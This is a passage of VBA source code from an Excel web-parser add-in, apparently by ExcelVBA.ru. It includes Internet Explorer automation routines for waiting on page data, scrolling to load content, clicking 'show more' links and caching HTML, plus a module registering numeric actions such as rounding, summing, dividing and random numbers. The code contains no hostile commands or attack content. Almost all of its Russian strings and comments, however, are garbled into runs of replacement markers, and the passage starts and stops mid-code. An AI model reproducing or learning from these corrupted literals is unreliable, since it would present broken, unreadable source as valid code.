        Select Case RunningParser.SetError("|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Internet Explorer", "|fffd||fffd||fffd||fffd| IE |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| !URL", URL$, True)
            Case vbIgnore        ' do nothing
            Case vbAbort: StopMacro = True
            Case vbRetry: GoTo LabelShowRunningIE
        End Select
        Set IE = Nothing
        ShowRunningIE = "IE not found"
    End If
End Function

Function ActionIE_WaitForData(ByVal Timeout&, ByVal Mask$) As String
    On Error Resume Next
    If Mask$ = "" Then Mask$ = "*?*"
    Dim StartTime&, LastTime&, html$
    
    StartTime& = GetTickCount
    Do While Abs(GetTickCount - StartTime&) < Timeout& * 1000
        html$ = "": html$ = IE.document.body.innerHTML
        If html$ Like Mask$ Then ActionIE_WaitForData = html$: Exit Function
        LastTime& = GetTickCount
        Do While Abs(GetTickCount - LastTime&) < 300
            DoEvents
        Loop
    Loop
End Function


Function ActionIE_Scroll(ByVal Timeout&, ByVal LinkToClick$, Optional ByVal MaxScrolls&, _
        Optional ByRef WP As WebsiteParser, Optional ByVal CacheURL$) As String
    On Error Resume Next
    Dim startLen&, sHeight&, currentLen&, timer_value As Double, scrolls_count&
    If Timeout& <= 0 Then Timeout& = 1
    
    If IE Is Nothing Then Exit Function
    
    WaitForIE Timeout&
    
    startLen& = Len(IE.document.body.outerHTML)
    
    'If Len(Trim(LinkToClick$)) > 0 Then ClickMoreLink IE, LinkToClick$, WP        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|...|fffd|
    
    WP.PrInd1.ShowMessage tt("PI_ShowMessage_ScrollingIE", 1, startLen&)
    
    sHeight& = IE.document.body.ScrollHeight        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    IE.document.parentWindow.scrollTo 0, sHeight&        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If StopMacro Then Exit Function
    WaitForIE Timeout&
    
    timer_value = Timer: scrolls_count& = 1
    Do While Timer - timer_value < Timeout&
        DoEvents
        If StopMacro Then Exit Function
        currentLen& = 0: currentLen& = Len(IE.document.body.outerHTML)
        'If Len(Trim(LinkToClick$)) > 0 Then ClickMoreLink IE, LinkToClick$, WP        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|...|fffd|
        
        If currentLen& = startLen& Then
            If Len(Trim(LinkToClick$)) > 0 Then
                ClickMoreLink IE, LinkToClick$, WP        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|...|fffd|
                currentLen& = 0: currentLen& = Len(IE.document.body.outerHTML)
            End If
        End If
        
        If currentLen& > startLen& Then
            sHeight& = IE.document.body.ScrollHeight        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            IE.document.parentWindow.scrollTo 0, sHeight&        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If StopMacro Then Exit Function
            WaitForIE
            
            timer_value = Timer
            startLen& = currentLen&
            scrolls_count& = scrolls_count& + 1
            WP.PrInd1.ShowMessage tt("PI_ShowMessage_ScrollingIE", scrolls_count&, startLen&)
            
            If MaxScrolls& > 0 Then If scrolls_count& >= MaxScrolls& Then Exit Do
            DoEvents
        End If
    Loop
    ActionIE_Scroll = IE.document.body.outerHTML
    WP.PrInd1.HideMessages
    
    If Len(CacheURL$) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim CacheFolder$, CacheFilename$, FSO As Object, ts As Object
        CacheFolder$ = WP.GetCacheFolderPath
        If (Len(CacheFolder$) > 0) And FolderExists(CacheFolder$) Then
            Set FSO = CreateObject("scripting.FileSystemObject")
            CacheFilename$ = "IE=" & FWF.Replace_symbols(Replace(Replace(CacheURL$, "http://", ""), "/", "|fffd|")) & ".txt"
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            Set ts = FSO.CreateTextFile(CacheFolder$ & CacheFilename$, True, True)
            ts.Write ActionIE_Scroll: ts.Close
            Set ts = Nothing: Set FSO = Nothing
        End If
    End If
    
    DoEvents
End Function

Sub ClickMoreLink(ByRef IE As Object, ByVal LinkToClick$, ByRef WP As WebsiteParser)
    On Error Resume Next
    Dim EL As Object, TagName$
    TagName$ = "a": If LinkToClick$ Like "<?* *" Then TagName$ = Mid(Split(LinkToClick$, " ")(0), 2)
    If IE.document.body.innerHTML Like "*" & LinkToClick$ & "*" Then
        WP.PrInd1.ShowMessage tt("PI_ShowMessage_LookingForShowMore") & " ..."
        For Each EL In IE.document.body.all
            If EL.TagName = TagName$ Then
                If EL.outerHTML Like LinkToClick$ Then
                    WP.PrInd1.ShowMessage tt("PI_ShowMessage_FollowingShowMore") & " ..."
                    EL.Click
                    Exit For
                End If
            End If
        Next EL
        Set EL = Nothing
        WP.PrInd1.ShowMessage tt("PI_ShowMessage_WaitingForPageLoad") & " ..."
        WaitForIE
        WP.PrInd1.HideMessages
    End If
End Sub

Attribute VB_Name = "mod_AAs_Numbers"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Numbers
' Author        : EducatedFool                     Date: 31.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Numbers(ByRef AAs As ArrayActions)
    On Error Resume Next

    With AAs.AddAction(fc_Numbers, "Round", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| -1 |fffd||fffd||fffd| -2"
        .AddParameter "NumDigitsAfterDecimal", aps_Combo, "|fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-3", "-2", "-1", "0", "1", "2", "3", "4"), "0"
    End With

    With AAs.AddAction(fc_Numbers, "SumValues", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Param", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NumDigitsAfterDecimal", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-1", "0", "1", "2", "3", "4"), "0"
    End With

    With AAs.AddAction(fc_Numbers, "MultiplyValues", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Param", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NumDigitsAfterDecimal", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-1", "0", "1", "2", "3", "4"), "0"
    End With

    With AAs.AddAction(fc_Numbers, "DivideValues", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|), |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| #|fffd||fffd||fffd|/0!"
        .AddParameter "Param", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NumDigitsAfterDecimal", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-1", "0", "1", "2", "3", "4"), "0"
    End With

    With AAs.AddAction(fc_Numbers, "NumericArrayFunction", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Function", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("Min", "Max", "Average", "Median"), "Min"
    End With

    With AAs.AddAction(fc_Numbers, "CompareNumbers", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| +10 |fffd| 100-|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| -1*10 |fffd| 100-|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Min", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Max", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Numbers, "CharactersCount", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Output", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_Numbers, "GetNumberFromText", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "ExcludeChars", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| , |fffd||fffd||fffd| .)"
        .AddParameter "NumDigitsAfterDecimal", aps_Combo, "|fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-3", "-2", "-1", "0", "1", "2", "3", "4"), "2"
    End With

    With AAs.AddAction(fc_Numbers, "GetRandomNumber", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Min", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "1"
        .AddParameter "Max", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "1000"
        .AddParameter "Divider", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "10", "1000"), "1"
        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
End Sub

Attribute VB_Name = "mod_AAs_PagerFunction"
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 05.01.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Function GetPagerLinks(ByVal txt$, Optional ByVal Filters$ = "auto", Optional ByVal PagerMask$, Optional ByVal PagerParameters$) As String
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next

    Dim res$, PagerClasses As Variant, ClassName, msg$, Content$, cnt&, i&, URL$, arr, LinksCount&, BaseURL$
    BaseURL$ = ParserVariables.item(LAST_USED_URL_VARNAME$)

